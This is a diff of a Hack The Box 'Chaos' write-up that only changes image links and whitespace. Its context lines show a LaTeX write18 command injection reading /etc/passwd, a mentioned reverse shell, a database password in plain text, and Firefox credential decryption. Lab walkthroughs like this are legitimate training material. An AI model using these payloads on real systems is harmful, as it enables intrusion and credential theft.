@@ -72,7 +72,7 @@ gobuster -u http://10.10.10.120/ dir -w /usr/share/dirbuster/wordlists/directory
 
 We get the path _/wp_ from which we were can browse to a WordPress page with an article that is password protected.
 
-![WordPress page](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_wp-page.png)
+![WordPress page](chaos_wp-page.png)
 
 When seeing a WordPress page the first thing to do is to start **WPScan** to look for vulnerabilities and potential usernames:
 ```markdown
@@ -115,14 +115,14 @@ TestA001 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SO
 This verifies that the credentials work so we can set up a mail client where we can look if this user has mails.
 I will use the mail client **Evolution** and configure it accordingly to access the mailbox of _ayush_:
 
-![Mailbox of user](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_mailbox.png)
+![Mailbox of user](chaos_mailbox.png)
 
 There is this one e-mail with two attachments:
 - enim_msg.txt
   - file: data; non-readable characters
 - en.py
   - A python script that encrypts files
-  
+
 We need to modify the encryption script to decrypt the given file with the password _sahay_ because he hints that in the e-mail. The modified script will be found in this folder named **chaos_encrypt.py**.
 
 ```markdown
@@ -153,7 +153,7 @@ Ayush
 
 Browsing to the web page we get a service that seems to generate PDF files.
 
-![PDF Generator](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_pdf-creator.png)
+![PDF Generator](chaos_pdf-creator.png)
 
 ## Exploiting the PDF-Generator service
 
@@ -166,7 +166,7 @@ I will use the Cheat Sheets from [PayLoadAllTheThings](https://github.com/swissk
 
 The command execution _\immediate\write18{cat /etc/passwd}_ works and gives us the output from that file:
 
-![Command execution successful](https://kyuu-ji.github.io/htb-write-up/chaos/chaos_rce.png)
+![Command execution successful](chaos_rce.png)
 
 So we can execute commands to start a reverse shell. I will use this command that listens on my IP and port 9001:
 ```markdown
@@ -187,7 +187,7 @@ The credentials we get are:
 ```markdown
 /* MySQL database username */                 
 define('DB_USER', 'roundcube');
-                                                   
+
 /* MySQL database password */
 define('DB_PASSWORD', 'inner[OnCag8');
 ```
@@ -201,7 +201,7 @@ echo $PATH
 /home/ayush/.app
 ```
 
-In this directory we find three commands that _ayush_ can execute: 
+In this directory we find three commands that _ayush_ can execute:
 - dir
 - ping
 - tar
@@ -226,7 +226,7 @@ Executing that script in that directory and using the same password from _ayush_
 python firefox_decrypt.py /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/
 ```
 ```markdown
-Master Password for profile /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/: 
+Master Password for profile /root/Documents/htb/boxes/chaos/.mozilla/firefox/bzo7sjt1.default/:
 
 Website:   https://chaos.htb:10000
 Username: 'root'
